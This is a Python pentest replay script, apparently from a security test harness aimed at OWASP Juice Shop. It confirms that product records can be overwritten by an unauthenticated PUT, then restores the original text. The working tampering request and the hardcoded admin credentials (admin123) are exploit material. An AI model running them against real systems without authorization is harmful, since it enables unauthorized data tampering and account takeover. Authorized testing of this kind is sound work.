#!/usr/bin/env python3
"""pt16: any product can be overwritten with no authentication at all.

server.js's own route table shows why, right there as a comment:

    // app.put('/api/Products/:id', security.isAuthorized())  <- commented out
    app.delete('/api/Products/:id', security.denyAll());

The authorization middleware for PUT was simply never turned on. No
token, no login, nothing. This mutates live product data on the
shared container, so this scenario restores the original description
immediately after confirming the tamper, every run, regardless of
outcome.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt16-001.json"
ADMIN_EMAIL = "admin@juice-sh.op"
ADMIN_PASSWORD = "admin123"  # the weak credential pt07 confirmed; reused here only to prove the legitimate path


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    product_id = blueprint["test_product_id"]
    endpoint = f"{target}/api/Products/{product_id}"

    _, original_body = _request("GET", endpoint)
    original_description = original_body["data"]["description"]

    stamp = str(int(time.time()))
    tamper_text = f"pt16 unauthenticated tamper test {stamp}"
    exploit_status, exploit_body = _request("PUT", endpoint, body={"description": tamper_text})

    _, check_body = _request("GET", endpoint)
    actually_persisted = check_body.get("data", {}).get("description") == tamper_text

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and actually_persisted:
        status = "VULNERABLE"
        summary = "An unauthenticated PUT, no token at all, overwrote a real product's description, confirmed by reading it back."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, persisted={actually_persisted}."

    # Restore immediately, regardless of outcome: there's nothing to
    # restore if the attack was blocked, and the request is harmless
    # either way (it's the same no-op PUT a legitimate admin would send).
    _request("PUT", endpoint, body={"description": original_description})
    _, restored_body = _request("GET", endpoint)
    restored_ok = restored_body.get("data", {}).get("description") == original_description

    admin_login_status, admin_login_body = _request("POST", f"{target}/rest/user/login", body={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD})
    legitimate_admin_tamper_ok = False
    if admin_login_status == 200:
        admin_token = admin_login_body["authentication"]["token"]
        legit_status, _ = _request("PUT", endpoint, token=admin_token, body={"description": original_description})
        legitimate_admin_tamper_ok = legit_status == 200

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "original_description_restored": restored_ok,
        "legitimate_admin_tamper_ok": legitimate_admin_tamper_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt16-unauthenticated-product-tampering", **result})

    if result["status"] == "ERROR" or not result["original_description_restored"]:
        sys.exit(2)


if __name__ == "__main__":
    main()
